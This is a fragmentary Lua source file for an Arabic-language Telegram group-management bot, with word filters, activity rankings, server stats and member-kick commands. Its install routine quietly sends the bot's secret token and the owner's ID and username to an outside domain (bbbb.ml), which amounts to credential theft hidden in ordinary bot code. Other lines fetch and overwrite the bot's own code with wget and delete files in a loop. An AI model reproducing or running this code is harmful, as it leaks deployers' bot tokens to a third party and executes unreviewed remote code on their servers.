...
https.request('http://bbbb.ml/CowleyUS/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("CowleyUS", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/CowleyUS
token="]]..database:get(id_server..":token")..[["
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./CowleyUS.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("UH", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S CowleyUS-X kill
screen -S CowleyUS./CowleyUS
done
]])  
file:close() 
...
local homeland_Msg = ''  
if msgs < 100 then 
homeland_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
homeland_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
homeland_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
homeland_Msg = 'متفاعل' 
elseif msgs < 1200 then 
homeland_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
homeland_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
homeland_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
homeland_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
homeland_Msg = 'قمة التفاعل' 
elseif msgs < 5500 then 
homeland_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
homeland_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
homeland_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
homeland_Msg = 'رب التفاعل'  
end 
return homeland_Msg 
end
...
--------------------------------------------------------------------------------------------------------------
function Sourcehomeland(msg,data) -- بداية العمل
if msg then
...
if start then 
SourceCowleyUSr = start
else
SourceCowleyUSr = ' ゠ههلو عمري 💞⸼\n゠لتفعيل البوت في مجموعتك 𖧧.\n゠اضف البوت مشرف في مجموعتك 𖧧.\n゠ثم ارسل ◝ تفعيل ◟ 𖧧.'
end 
send(msg.chat_id_, msg.id_, SourceCowleyUSr) 
end
end
...
send(msg.chat_id_, msg.id_,CowleyUS_Msg) 
return false  
end 
if text then    
...
if text == 'معلومات السيرفر 📊' and SudoBot(msg) then 
 local text2 = 'Info Server : \n'
  local CowleyUS = database:info()
  text2 = text2..'1 - *Uptime Days* : `'..CowleyUS.server.uptime_in_days..'('..CowleyUS.server.uptime_in_seconds..' seconds)`\n'
  text2 = text2..'2 - *Commands Processed* : `'..CowleyUS.stats.total_commands_processed..'`\n'
  text2 = text2..'3 - *Expired Keys* : `'..CowleyUS.stats.expired_keys..'`\n'
  text2 = text2..'4 - *Ops/sec* : `'..CowleyUS.stats.instantaneous_ops_per_sec..'`\n'
...
os.execute('wget https://raw.githubusercontent.com/FASAZTEAE/homeland/master/homeland.lua')
...
send(msg.chat_id_, msg.id_,'📌| عدد المجموعات الان » { '..#group..' }'..homelandk..''..homeland..'\n*📌| الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
local CowleyUS_Msg = database:get(bot_id.."CowleyUS:Add:Filter:Rp2"..text..msg.chat_id_)   
if CowleyUS_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
--------------------------------------------------------------------------------------------------------------
if homeland_Msg and not Special(msg) then  
local homeland_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if homeland_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
os.execute('rm -rf CowleyUS.lua')
os.execute('wget https://raw.githubusercontent.com/CowleyUSTEEM/CowleyUS/master/CowleyUS.lua')
...
database:set(bot_id.."CowleyUS1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."CowleyUS1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"܁༯┆ارسل التحذير عند ارسال الكلمة 💞 ܰ")  
database:set(bot_id.."CowleyUS1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."CowleyUS1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."CowleyUS1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."CowleyUS1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"܁༯┆تم منع الكلمه مع التحذير 💞 ܰ")  
database:del(bot_id.."CowleyUS1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."CowleyUS1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."CowleyUS1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."CowleyUS1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"܁༯┆ارسل الكلمةه الان 💞 ܰ ")  
database:set(bot_id.."CowleyUS1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."CowleyUS1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."CowleyUS1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."CowleyUS1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."CowleyUS1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."CowleyUS1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."CowleyUS1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."CowleyUS1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."CowleyUS1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n٭ 𖤓┆قائمة المنع ☓💞◟\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do  
local CowleyUS_Msg = database:get(bot_id.."CowleyUS1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t.."܁ 𖠵 "..k.." ゠ "..v.." ◃ ◞"..CowleyUS_Msg.."◜\n"    
end  
if #list == 0 then  
...
send(msg.chat_id_, msg.id_,'['..CowleyUS_Msg[math.random(#CowleyUS_Msg)]..']') 
return false
end
...
},function(ta,CowleyUS)
local t = "\n٭ 𖤓 ┆ههلاو يَمحتحتين 💞💞◟\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
x = 0
local list = CowleyUS.members_
for k, v in pairs(list) do
x = x + 1
...
-- vardump(data) 
homelanddx(msg.chat_id_, msg.id_, '📤| ايدي المجموعة » ( '..msg.chat_id_..' )\n🚸| عدد الادمنيه » ( *'..data.administrator_count_..' )*\n📛| عدد المحظورين » ( *'..data.kicked_count_..' )*\n🏆| عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
CowleyUS= https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(CowleyUS)
...
--------------------------------------------------------------------------------------------------------------
SourceCowleyUS(data.message_,data)
plugin_CowleyUSa(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
------------------------------------------------------------------------
local CowleyUSAbot = database:get(bot_id.."CowleyUS1:Add:Filter:Rp2"..text..result.chat_id_)   
if CowleyUSAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┇["..CowleyUSAbot.."] \n") 
else
...
------------------------------------------------------------------------
if text then
local CowleyUS1_Msg = database:get(bot_id.."CowleyUS1:Add:Filter:Rp2"..text..result.chat_id_)   
if CowleyUS1_Msg then    
send(msg.chat_id_, msg.id_,"🔖┇"..CowleyUS1_Msg)
